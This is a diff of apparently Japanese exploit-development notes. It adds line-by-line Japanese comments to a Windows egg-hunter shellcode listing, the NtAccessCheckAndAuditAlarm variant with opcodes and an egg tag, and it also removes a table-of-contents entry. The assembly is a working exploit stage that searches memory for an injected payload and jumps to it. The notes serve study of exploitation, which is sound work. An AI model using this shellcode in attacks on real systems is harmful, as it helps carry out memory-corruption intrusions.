@@ -69,7 +69,6 @@
     - [metasploit](#metasploit)
     - [nasm](#nasm)
       - [bypass NULLbyte](#bypass-nullbyte)
-      - [Egg-Hunter](#egg-hunter)
     - [Windows周り](#windows%E5%91%A8%E3%82%8A)
     - [alarmのbypass](#alarm%E3%81%AEbypass)
     - [Cの関数](#c%E3%81%AE%E9%96%A2%E6%95%B0)
@@ -2414,27 +2413,40 @@ egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
 Egg hunter using NtAccessCheck (AndAuditAlarm)   
 ```txt
 # Egg hunter size = 32 bytes, Egg size = 8 bytes
-6681CAFF0F  or dx,0x0fff   ; get last address in page
+6681CAFF0F  or dx,0x0fff   ; はじめはedx=0x00000000に0x0fffを代入。
+                           ; 2回目のループでは0x00001000に0xfffを代入して、0x00001fffとなる。
 42          inc edx        ; acts as a counter
                            ;(increments the value in EDX)
 52          push edx       ; pushes edx value to the  stack
                            ;(saves our current address on the stack)
+                           ; このedxの値が、syscallによって読み込み権限があるか確認するアドレス
+                           ; 権限がない(Access-violationが発生)と、0x1000足して次のアドレスの権限を確認を繰り返す。
 6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
                            ; or 0x43 for NtDisplayString to stack
+                           ; syscallの番号。カーネルモードでアドレスの値を参照して権限を確認する。
+                           ; 文字列へのポインタを引数にとり、読み込もうとするsyscallの関数を使う。
 58          pop eax        ; pop 0x2 or 0x43 into eax
                            ; so it can be used as parameter
                            ; to syscall - see next
+                           ; syscallの番号はeaxに代入しておく。
 CD2E        int 0x2e       ; tell the kernel i want a do a
                            ; syscall using previous register
+                           ; カーネルモードでKiSystemService関数を呼びだす。
+                           ; この関数が、syscall番号に対応する関数(NtAccessCheckAndAuditAlarmなど)を呼び出す
 3C05        cmp al,0x5     ; check if access violation occurs
                            ;(0xc0000005== ACCESS_VIOLATION) 5
+                           ; Access-Violationが発生すると、読み込み権限がないので、そもそもeggがあるかすら確認できない
 5A          pop edx        ; restore edx
 74EF        je xxxx        ; jmp back to start dx 0x0fffff
 B890509050  mov eax,0x50905090 ; this is the tag (egg)
 8BFA        mov edi,edx    ; set edi to our pointer
-AF          scasd          ; compare for status
+AF          scasd          ; compare for status. 「ediから読み込んだ値」と「eaxの値」を比較
+                           ; edi(0x1000とか)から読み込んだ値とeax(egg)の値を比較
+                           ; 比較したあと、edi+0x4される。つまり、2つ目の4バイトのeggを指すようになる。
 75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not
+                           ; eggが見つからなければjmpする
 AF          scasd          ; when egg has been found
+                           ; 比較後は、2つ目の4バイトのeggから、次の4バイト後のshellcodeを指すようになる
 75E7        jnz xxxxx      ; (jump back to "inc edx")
                            ; if only the first egg was found
 FFE7       jmp edi         ; edi points to begin of the shellcode
